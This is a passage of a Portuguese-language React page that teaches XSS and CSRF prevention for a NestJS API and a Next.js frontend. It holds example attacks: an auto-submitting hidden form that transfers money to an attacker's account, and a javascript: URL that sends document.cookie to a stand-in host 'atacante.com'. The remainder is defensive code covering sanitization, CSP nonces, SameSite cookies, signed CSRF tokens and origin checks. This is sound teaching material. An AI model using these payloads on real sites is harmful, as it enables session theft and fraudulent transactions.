              pelo cookie de sessão. Não exige nada além disso: nem header customizado, nem token
              anti-CSRF.
            </p>

            <p>
              <strong>O ataque.</strong> O atacante cria{' '}
              <code className='text-[14px]'>site-de-jogos.com</code> e atrai a vítima para lá.
              Dentro da página existe um formulário invisível que se envia sozinho ao carregar:
            </p>

            <pre className='overflow-x-auto rounded-[8px] bg-gray-100 p-[16px] text-[13px] leading-[1.5]'>
              <code>
                {`<form id="csrfForm" action="https://banco.com/api/transferir" method="POST">
  <input type="hidden" name="para" value="conta-do-atacante" />
  <input type="hidden" name="valor" value="1000" />
</form>

<script>
  document.getElementById('csrfForm').submit()
</script>`}
              </code>
            </pre>

            <p>
              <strong>A execução.</strong> O navegador da vítima faz um POST direto para{' '}
              <code className='text-[14px]'>banco.com</code>. Como a requisição vai para o domínio
              do banco, o navegador anexa o cookie de sessão automaticamente. O banco valida o
              cookie legítimo da vítima e transfere os R$ 1.000. O atacante não conseguiu ler a
              resposta, mas a ação destrutiva foi concluída.
            </p>

            <p>
              Repare que a vítima nunca clicou em nada no banco, e o atacante nunca viu o cookie.
              Ele só precisou saber o formato da requisição.
            </p>
          </div>
        </div>
      </AboutCollapse>
    </AboutCollapse>

    <AboutCollapse variant='section' defaultOpen title='Proteções'>
      <AboutCollapse title='Como prevenir XSS no NestJS'>
        <div className='flex flex-col gap-y-[16px]'>
          <p>
            A API reduz a superfície, mas não é ela quem escapa o conteúdo. XSS acontece na hora de
            renderizar HTML, e isso é responsabilidade de quem monta a página. O que o Nest faz é
            controlar o que entra e o que sai.
          </p>

          <div className='flex flex-col'>
            <AboutCollapse variant='item' title='Validação estrita de DTOs'>
              <div className='flex flex-col gap-y-[12px]'>
                <p>
                  Todo payload tem um DTO com decorators do{' '}
                  <code className='text-[14px]'>class-validator</code>, e o{' '}
                  <code className='text-[14px]'>ValidationPipe</code> global roda com{' '}
                  <code className='text-[14px]'>whitelist</code> e{' '}
                  <code className='text-[14px]'>forbidNonWhitelisted</code>:
                </p>

                <pre className='overflow-x-auto rounded-[8px] bg-gray-100 p-[16px] text-[13px] leading-[1.5]'>
                  <code>
                    {`app.useGlobalPipes(
  new ValidationPipe({ whitelist: true, forbidNonWhitelisted: true, transform: true })
)`}
                  </code>
                </pre>

                <p>
                  Propriedade que não existe no DTO vira 400 em vez de chegar no banco, e cada campo
                  só aceita o formato declarado (<code className='text-[14px]'>@IsEmail</code>,{' '}
                  <code className='text-[14px]'>@Length</code>,{' '}
                  <code className='text-[14px]'>@Matches</code>).
                </p>

                <p>
                  Isso corta campo que nunca deveria conter marcação, como email ou UUID. Não
                  resolve campo de texto livre: um nome de perfil pode legitimamente conter{' '}
                  <code className='text-[14px]'>{'<script>'}</code> e passar em qualquer validação
                  de tamanho. Validação limita formato, não codifica saída.
                </p>
              </div>
            </AboutCollapse>

            <AboutCollapse variant='item' title='Sanitização de entradas HTML'>
              <div className='flex flex-col gap-y-[12px]'>
                <p>
                  Só entra em cena quando o campo precisa mesmo aceitar HTML, tipo um editor de
                  texto rico. Aí a validação não basta e o conteúdo passa por um sanitizador que
                  remove tudo que não estiver numa lista de permitidos:
                </p>

                <pre className='overflow-x-auto rounded-[8px] bg-gray-100 p-[16px] text-[13px] leading-[1.5]'>
                  <code>
                    {`sanitizeHtml(input.bio, {
  allowedTags: ['b', 'i', 'em', 'strong', 'a', 'p', 'ul', 'li'],
  allowedAttributes: { a: ['href'] }
})`}
                  </code>
                </pre>

                <p>
                  Lista de permitidos, nunca lista de proibidos. Tentar bloquear{' '}
                  <code className='text-[14px]'>{'<script>'}</code> é jogo perdido: sobra{' '}
                  <code className='text-[14px]'>onerror</code>,{' '}
                  <code className='text-[14px]'>javascript:</code>, SVG, e variações de encoding que
                  ninguém antecipa.
                </p>

                <p>
                  Se o campo é texto puro, não sanitize: guarde exatamente o que o usuário escreveu
                  e nunca renderize como HTML. Sanitizar texto que não é HTML só corrompe dado
                  legítimo.
                </p>
              </div>
            </AboutCollapse>

            <AboutCollapse variant='item' title='Cabeçalhos HTTP com helmet'>
              <div className='flex flex-col gap-y-[12px]'>
                <p>
                  Uma linha no <code className='text-[14px]'>main.ts</code> que liga um conjunto de
                  cabeçalhos de segurança:
                </p>

                <pre className='overflow-x-auto rounded-[8px] bg-gray-100 p-[16px] text-[13px] leading-[1.5]'>
                  <code>{'app.use(helmet())'}</code>
                </pre>

                <p>
                  Os que importam aqui:{' '}
                  <code className='text-[14px]'>X-Content-Type-Options: nosniff</code>, que impede o
                  navegador de adivinhar que um JSON é HTML e renderizar; e o{' '}
                  <code className='text-[14px]'>Content-Security-Policy</code>, que restringe de
                  onde script pode ser carregado e executado.
                </p>

                <p>
                  Ressalva importante: esses cabeçalhos valem para as respostas <em>desta</em> API.
                  Eles não protegem a página do frontend, que roda em outro host e traz a própria
                  CSP. Numa API que só devolve JSON, o helmet cobre principalmente o caso de uma
                  resposta acabar sendo renderizada como documento, como página de erro ou arquivo
                  enviado por usuário.
                </p>
              </div>
            </AboutCollapse>
          </div>
        </div>
      </AboutCollapse>

      <AboutCollapse title='Como prevenir XSS no Next.js'>
        <div className='flex flex-col gap-y-[16px]'>
          <p>
            Aqui é onde XSS realmente acontece. A API entrega dados, o frontend decide se aquilo
            vira texto ou vira marcação executável. React já começa do lado seguro, então quase todo
            XSS em Next.js vem de alguém saindo do caminho padrão de propósito.
          </p>

          <div className='flex flex-col'>
            <AboutCollapse variant='item' title='React escapa por padrão'>
              <div className='flex flex-col gap-y-[12px]'>
                <p>
                  Qualquer valor interpolado em JSX vira texto, não HTML. Se o nome do usuário for{' '}
                  <code className='text-[14px]'>{'<script>alert(1)</script>'}</code>, a tela mostra
                  exatamente esses caracteres:
                </p>

                <pre className='overflow-x-auto rounded-[8px] bg-gray-100 p-[16px] text-[13px] leading-[1.5]'>
                  <code>{'<p>{user.name}</p>'}</code>
                </pre>

                <p>
                  Vale para Server Component e Client Component igual, e é o motivo de o comentário
                  malicioso do card de XSS não funcionar num app React. O fórum do exemplo só
                  quebrou porque montava HTML na mão.
                </p>

                <p>
                  Ou seja: a defesa já está ligada. O trabalho é não desligá-la nos três casos
                  abaixo.
                </p>
              </div>
            </AboutCollapse>

            <AboutCollapse variant='item' title='dangerouslySetInnerHTML'>
              <div className='flex flex-col gap-y-[12px]'>
                <p>
                  A única saída oficial do escape do React, e o nome longo é proposital. Tudo que
                  passar por aqui é interpretado como marcação de verdade:
                </p>

                <pre className='overflow-x-auto rounded-[8px] bg-gray-100 p-[16px] text-[13px] leading-[1.5]'>
                  <code>
                    {`// nunca com conteúdo vindo do usuário
<div dangerouslySetInnerHTML={{ __html: comment.body }} />

// se precisar mesmo de HTML, sanitize antes de chegar aqui
<div dangerouslySetInnerHTML={{ __html: sanitizeHtml(comment.body) }} />`}
                  </code>
                </pre>

                <p>
                  Sanitizar no servidor, na entrada, é melhor que sanitizar na renderização: um dado
                  limpo no banco é limpo em toda tela que o exibir. Sanitizar só no componente
                  protege aquele componente e nenhum outro.
                </p>

                <p>
                  <code className='text-[14px]'>innerHTML</code> direto,{' '}
                  <code className='text-[14px]'>document.write</code> e{' '}
                  <code className='text-[14px]'>eval</code> em{' '}
                  <code className='text-[14px]'>useEffect</code> caem na mesma categoria.
                </p>
              </div>
            </AboutCollapse>

            <AboutCollapse variant='item' title='URLs vindas do usuário'>
              <div className='flex flex-col gap-y-[12px]'>
                <p>
                  O buraco menos óbvio. React escapa o <em>conteúdo</em> de um atributo, mas não
                  julga o que aquela URL faz:
                </p>

                <pre className='overflow-x-auto rounded-[8px] bg-gray-100 p-[16px] text-[13px] leading-[1.5]'>
                  <code>
                    {`// se profile.website for "javascript:fetch('https://atacante.com?c='+document.cookie)"
// o clique executa
<a href={profile.website}>site</a>`}
                  </code>
                </pre>

                <p>
                  A correção é validar o protocolo antes de renderizar, aceitando{' '}
                  <code className='text-[14px]'>https:</code> e{' '}
                  <code className='text-[14px]'>http:</code> e descartando o resto:
                </p>

                <pre className='overflow-x-auto rounded-[8px] bg-gray-100 p-[16px] text-[13px] leading-[1.5]'>
                  <code>
                    {`const isSafeUrl = (value: string) => {
  try {
    return ['http:', 'https:'].includes(new URL(value).protocol)
  } catch {
    return false
  }
}`}
                  </code>
                </pre>

                <p>
                  Mesmo cuidado para redirect pós-login lido da query string. Sem essa checagem,
                  além de <code className='text-[14px]'>javascript:</code>, sobra redirecionamento
                  aberto para um domínio de phishing.
                </p>
              </div>
            </AboutCollapse>

            <AboutCollapse variant='item' title='Content-Security-Policy com nonce'>
              <div className='flex flex-col gap-y-[12px]'>
                <p>
                  Última camada, para quando alguma das anteriores falhar. A CSP diz ao navegador
                  quais scripts ele pode executar, e o nonce é gerado por requisição no{' '}
                  <code className='text-[14px]'>middleware.ts</code>:
                </p>

                <pre className='overflow-x-auto rounded-[8px] bg-gray-100 p-[16px] text-[13px] leading-[1.5]'>
                  <code>
                    {`const nonce = crypto.randomUUID()

response.headers.set(
  'Content-Security-Policy',
  \`script-src 'self' 'nonce-\${nonce}' 'strict-dynamic'; object-src 'none'; base-uri 'self'\`
)`}
                  </code>
                </pre>

                <p>
                  Script injetado não carrega o nonce daquela requisição, então o navegador se
                  recusa a executar mesmo que a tag tenha entrado no HTML. É a diferença entre um
                  XSS que vira sessão roubada e um XSS que vira erro no console.
                </p>

                <p>
                  Sem nonce a CSP precisaria de <code className='text-[14px]'>unsafe-inline</code>{' '}
                  para o Next funcionar, e aí ela não protege contra nada.
                </p>
              </div>
            </AboutCollapse>

            <AboutCollapse variant='item' title='Token nenhum ao alcance do JavaScript'>
              <div className='flex flex-col gap-y-[12px]'>
                <p>
                  Esta app nunca vê um token. Nada de{' '}
                  <code className='text-[14px]'>localStorage</code>,{' '}
                  <code className='text-[14px]'>sessionStorage</code>, variável de módulo ou header{' '}
                  <code className='text-[14px]'>Authorization</code>. A sessão vive em cookie{' '}
                  <code className='text-[14px]'>HttpOnly</code>, invisível para{' '}
                  <code className='text-[14px]'>document.cookie</code>.
                </p>

                <p>
                  Isso não impede XSS, muda o estrago. Com token em{' '}
                  <code className='text-[14px]'>localStorage</code>, uma linha de script exfiltra a
                  credencial e o atacante usa a conta de onde quiser, por quanto tempo o token
                  durar. Com cookie <code className='text-[14px]'>HttpOnly</code>, ele continua
                  conseguindo agir em nome da vítima, mas só de dentro daquele navegador e enquanto
                  a página estiver aberta.
                </p>

                <p>Contenção, não cura. A correção do XSS continua sendo as camadas de cima.</p>
              </div>
            </AboutCollapse>
          </div>
        </div>
      </AboutCollapse>

      <AboutCollapse title='Como prevenir CSRF no NestJS'>
        <div className='flex flex-col gap-y-[16px]'>
          <p>
            Aqui é o contrário do XSS: a defesa é toda no servidor. Ele precisa distinguir uma
            requisição montada pela sua própria página de uma montada por outro site, e nenhuma
            camada sozinha faz isso direito. São quatro, em cima de uma regra.
          </p>

          <div className='flex flex-col'>
            <AboutCollapse variant='item' title='SameSite=Lax nos cookies'>
              <div className='flex flex-col gap-y-[12px]'>
                <p>
                  Primeira camada, e a mais barata: o navegador simplesmente não anexa o cookie num
                  POST vindo de fora. O ataque do formulário invisível morre aqui.
                </p>

                <pre className='overflow-x-auto rounded-[8px] bg-gray-100 p-[16px] text-[13px] leading-[1.5]'>
                  <code>
                    {`res.cookie('refresh_token', token, {
  httpOnly: true,
  secure: true,
  sameSite: 'lax',
  path: '/auth',
  maxAge: 14 * 24 * 60 * 60 * 1000
})`}
                  </code>
                </pre>

                <p>
                  O limite: <code className='text-[14px]'>Lax</code> raciocina por site, não por
                  host. Um subdomínio irmão comprometido conta como o mesmo site e passa por essa
                  camada sem encostar nela. É por isso que as próximas existem.
                </p>
              </div>
            </AboutCollapse>

            <AboutCollapse variant='item' title='Token double-submit assinado'>
              <div className='flex flex-col gap-y-[12px]'>
                <p>
                  Um terceiro cookie, <code className='text-[14px]'>csrf_token</code>, que
                  deliberadamente não é <code className='text-[14px]'>HttpOnly</code>: o frontend
                  precisa lê-lo e reenviá-lo no header{' '}
                  <code className='text-[14px]'>X-CSRF-Token</code>. Um guard global compara os dois
                  em toda requisição que altera estado.
                </p>

                <pre className='overflow-x-auto rounded-[8px] bg-gray-100 p-[16px] text-[13px] leading-[1.5]'>
                  <code>
                    {`const cookie = Buffer.from(request.cookies.csrf_token ?? '')
const header = Buffer.from(String(request.headers['x-csrf-token'] ?? ''))

if (cookie.length !== header.length || !timingSafeEqual(cookie, header))
  throw new ForbiddenException()`}
                  </code>
                </pre>

                <p>
                  A comparação é <code className='text-[14px]'>timingSafeEqual</code>, nunca{' '}
                  <code className='text-[14px]'>===</code>. O check de tamanho vem antes porque{' '}
                  <code className='text-[14px]'>timingSafeEqual</code> lança quando os buffers têm
                  comprimentos diferentes.
                </p>

                <p>
                  Por que funciona: outro site consegue fazer o navegador enviar cookies, mas não
                  consegue <em>ler</em> os seus para copiar o valor no header. O que ele monta é uma
                  requisição sem header, ou com header errado.
                </p>

                <p>
                  E o &quot;assinado&quot; resolve o subdomínio irmão. O valor não é aleatório, é um
                  HMAC sobre o <code className='text-[14px]'>jti</code> da sessão com um segredo do
                  servidor. Um vizinho malicioso até sobrescreve o cookie{' '}
                  <code className='text-[14px]'>csrf_token</code> e manda o header casando com ele,
                  mas não conhece o <code className='text-[14px]'>jti</code> da vítima, que vive
                  dentro de um cookie <code className='text-[14px]'>HttpOnly</code>. Sem isso,
                  double-submit puro cai para quem controla qualquer subdomínio.
                </p>

                <p>
                  O guard é global e tem um decorator de escape,{' '}
                  <code className='text-[14px]'>@SkipCsrf()</code>, para login e registro, que rodam
                  antes de existir sessão.
                </p>
              </div>
            </AboutCollapse>

            <AboutCollapse variant='item' title='Checagem de Origin'>
              <div className='flex flex-col gap-y-[12px]'>
                <p>
                  O navegador preenche <code className='text-[14px]'>Origin</code> sozinho e a
                  página não consegue forjar esse header. Basta conferir contra a mesma allowlist do
                  CORS:
                </p>

                <pre className='overflow-x-auto rounded-[8px] bg-gray-100 p-[16px] text-[13px] leading-[1.5]'>
                  <code>
                    {`const origin = request.headers.origin ?? request.headers.referer

if (!origin || !allowlist.some((allowed) => origin.startsWith(allowed)))
  throw new ForbiddenException()`}
                  </code>
                </pre>

                <p>
                  Ausente também é rejeição. Um POST que chega sem{' '}
                  <code className='text-[14px]'>Origin</code> não é o navegador que essa API atende.
                </p>
              </div>
            </AboutCollapse>

            <AboutCollapse variant='item' title='CORS com allowlist explícita'>
              <div className='flex flex-col gap-y-[12px]'>
                <p>
                  CORS não impede o envio da requisição, impede a leitura da resposta. Continua
                  sendo necessário porque app e API são origens diferentes:
                </p>

                <pre className='overflow-x-auto rounded-[8px] bg-gray-100 p-[16px] text-[13px] leading-[1.5]'>
                  <code>
                    {`app.enableCors({
  credentials: true,
  origin: corsOrigin.split(',').map((value) => value.trim()),
  allowedHeaders: ['Content-Type', 'Accept', 'X-CSRF-Token']
})`}
                  </code>
                </pre>

                <p>
                  Duas coisas não podem mudar: a origem é uma lista explícita, nunca{' '}
                  <code className='text-[14px]'>true</code> nem{' '}
                  <code className='text-[14px]'>&apos;*&apos;</code>, porque com{' '}
                  <code className='text-[14px]'>credentials: true</code> refletir a origem do
                  chamador entrega a conta; e <code className='text-[14px]'>X-CSRF-Token</code>{' '}
                  precisa estar nos headers permitidos, senão o preflight derruba toda mutação.
                </p>
              </div>
            </AboutCollapse>

            <AboutCollapse variant='item' title='Nenhuma rota GET altera estado'>
              <p>
                O guard pula <code className='text-[14px]'>GET</code>,{' '}
                <code className='text-[14px]'>HEAD</code> e{' '}
                <code className='text-[14px]'>OPTIONS</code>, senão clicar num link vindo de fora
                quebraria. Consequência direta: uma rota GET que muta continua alcançável
                cross-site, sem token e sem checagem. Não é convenção de estilo, é a única brecha
                que sobra depois das quatro camadas.
              </p>
            </AboutCollapse>
          </div>
        </div>
      </AboutCollapse>

      <AboutCollapse title='Como prevenir CSRF no Next.js'>
        <div className='flex flex-col gap-y-[16px]'>
          <p>
            Vale, mas com o papel invertido: quem decide se uma requisição é legítima continua sendo
            a API. O frontend não valida nada, ele só precisa provar que é ele mesmo. Se essa parte
            estiver errada, o guard do servidor bloqueia o próprio app.
          </p>

          <div className='flex flex-col'>
            <AboutCollapse variant='item' title='credentials: include em toda chamada'>
              <div className='flex flex-col gap-y-[12px]'>
                <p>
                  <code className='text-[14px]'>fetch</code> não manda cookie para outra origem por
                  padrão. Como app e API são hosts diferentes, sem isso nenhuma requisição chega
                  autenticada:
                </p>

                <pre className='overflow-x-auto rounded-[8px] bg-gray-100 p-[16px] text-[13px] leading-[1.5]'>
                  <code>
                    {`fetch(\`\${apiUrl}/auth/me\`, {
  credentials: 'include'
})`}
                  </code>
                </pre>

                <p>
                  Por isso existe um único wrapper de fetch no app em vez de chamadas soltas. Uma
                  chamada que esquece a opção não falha de um jeito óbvio, ela devolve 401 como se a
                  sessão tivesse expirado.
                </p>
              </div>
            </AboutCollapse>

            <AboutCollapse variant='item' title='Echo do csrf_token nas mutações'>
              <div className='flex flex-col gap-y-[12px]'>
                <p>
                  O <code className='text-[14px]'>csrf_token</code> é o único cookie legível por JS,
                  e é exatamente para isso: ler e devolver no header em{' '}
                  <code className='text-[14px]'>POST</code>,{' '}
                  <code className='text-[14px]'>PUT</code>,{' '}
                  <code className='text-[14px]'>PATCH</code> e{' '}
                  <code className='text-[14px]'>DELETE</code>.
                </p>

                <pre className='overflow-x-auto rounded-[8px] bg-gray-100 p-[16px] text-[13px] leading-[1.5]'>
                  <code>
                    {`const csrf = document.cookie
  .split('; ')
  .find((entry) => entry.startsWith('csrf_token='))
  ?.split('=')[1]

fetch(\`\${apiUrl}/auth/logout\`, {
  method: 'POST',
  credentials: 'include',
  headers: { 'X-CSRF-Token': csrf ?? '' }
})`}
                  </code>
                </pre>

                <p>
                  Ler o cookie na hora do envio, nunca guardar o valor em estado. Ele é rotacionado
                  a cada refresh, e uma cópia velha em memória vira 403 depois de quinze minutos de
                  aba aberta.
                </p>

                <p>
                  O valor não é segredo e não autentica ninguém. A prova está em conseguir lê-lo, o
                  que só a própria origem consegue.
                </p>
              </div>
            </AboutCollapse>

            <AboutCollapse variant='item' title='Nada de proxy no servidor do Next'>
              <div className='flex flex-col gap-y-[12px]'>
                <p>
                  A tentação é criar um route handler no Next que repassa a chamada para a API e
                  resolve o CORS. Isso reintroduz o CSRF por baixo: a requisição para a API passa a
                  sair de servidor para servidor, e o guard de{' '}
                  <code className='text-[14px]'>Origin</code> perde o header que usava para decidir.
                </p>

                <p>
                  Neste projeto o assunto nem chega a existir. Os cookies são host-only da API,
                  então o servidor do Next não consegue lê-los e não tem como montar essa chamada. É
                  consequência direta do <code className='text-[14px]'>Domain</code> ficar sem
                  valor.
                </p>

                <p>
                  Server Actions, se um dia entrarem aqui, trazem checagem própria de{' '}
                  <code className='text-[14px]'>Origin</code> contra{' '}
                  <code className='text-[14px]'>Host</code>. É defesa do Next para o endpoint do
                  Next, não substitui o guard da API.
                </p>
              </div>
            </AboutCollapse>

            <AboutCollapse variant='item' title='Sessão não é estado do cliente'>
              <div className='flex flex-col gap-y-[12px]'>
                <p>
                  Não existe token para inspecionar, então &quot;estou logado&quot; é uma pergunta
                  para a API: <code className='text-[14px]'>GET /auth/me</code> respondendo 200.
                </p>

                <p>
                  Redirecionar uma rota privada no cliente é experiência de uso, não segurança.
                  Middleware e Server Component também não conseguem decidir isso, porque não
                  enxergam os cookies. Quem protege o dado é a API, em toda requisição.
                </p>
              </div>
            </AboutCollapse>
          </div>
        </div>
      </AboutCollapse>
    </AboutCollapse>

    <AboutCollapse variant='section' defaultOpen title='Fluxo'>
      <AboutCollapse defaultOpen title='Login, passo a passo'>
        <div className='flex flex-col gap-y-[24px]'>
          <p>
            O resto da página em ordem cronológica, do clique em entrar até a requisição autenticada
            seguinte. Cada passo diz de que lado acontece e o que ele impede.
          </p>

          <AboutFlow />
        </div>
      </AboutCollapse>
    </AboutCollapse>
  </div>
)
